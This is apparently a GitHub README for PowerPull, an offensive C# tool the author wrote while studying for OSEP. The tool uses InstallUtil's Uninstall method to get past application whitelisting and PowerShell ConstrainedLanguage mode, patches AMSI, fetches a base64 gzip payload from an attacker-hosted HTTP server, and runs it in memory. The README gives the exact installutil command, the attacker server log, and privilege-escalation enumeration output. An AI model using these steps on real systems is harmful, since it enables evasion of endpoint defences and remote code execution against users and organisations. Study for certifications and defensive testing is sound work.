## PowerPull ##


While studying for OSEP, I wanted to teach myself the ability to re-write functionalities and get familiarity to C#. The course does a fantastic job at teaching but proves creative thinking.
I wrote this utility to execute a custom instance of powershell runspace when challenged with a PowerShell `ConstrainedLanguage` mode environment, all within a ApplicationWhitelisted system that only allows a limited user to unsintall files.

This program prepares a binary which needs to be deployed on the target host and can be invoked with "InstallUtil.exe", which further abuses the "Uninstall(System.Collections.IDictionary savedState)" being allowed for limited users. 

Upon execution of the binary with installutils.exe, the following things occur.

1. Patch AMSI using a known technique.
2. Download the base64encoded and zipped data.
3. Base64 decode and Uncompress the data in memory.
4. Execute the contents within a custom powershell runspace.
5. render the output into the console.

The idea is host a file called `base64encodedGzip.txt` on an attacker controlled system. This file is prepared using another utility prepared inside this repo called 'BasicZipper'. A sample of this content is included as pow.txt which can be renamed as `base64encodedGzip.txt` on your attacker system.

```
└─$ sudo python -m http.server 8080 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.44.101 - - [06/May/2023 07:42:21] "GET /base64encodedGzip.txt HTTP/1.1" 200 -
192.168.44.101 - - [06/May/2023 07:43:12] "GET /base64encodedGzip.txt HTTP/1.1" 200 -
192.168.44.101 - - [06/May/2023 07:44:53] "GET /base64encodedGzip.txt HTTP/1.1" 200 -
```
The following cmdlet indicates that the host is running on ConstrainedLanguagemode
```
PS C:\> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

Download PowerPull.exe to a folder that a user can write and execute. Then invoke it using InstallUtils.exe `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U .\PowerPull.exe`

```
PS C:> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U .\PowerPull.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.9037.0
Copyright (C) Microsoft Corporation.  All rights reserved.

[+] Download successful!
At the stage of bypass!

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.

[*] Checking for unquoted service paths...

[*] Checking service executable and argument permissions...

[*] Checking service permissions...

[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Users\evile\AppData\Local\Microsoft\WindowsApps\

[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...

DefaultDomainName    :
DefaultUserName      : evile
DefaultPassword      :
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :

[*] Checking for vulnerable registry autoruns and configs...
[*] Checking for vulnerable schtask files/configs...
[*] Checking for unattended install files...
UnattendPath : C:\Windows\Panther\Unattend.xml
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
```

Limitation: It appears only smaller scripts are able to be executed within the custom run space. So  your mileage may vary.

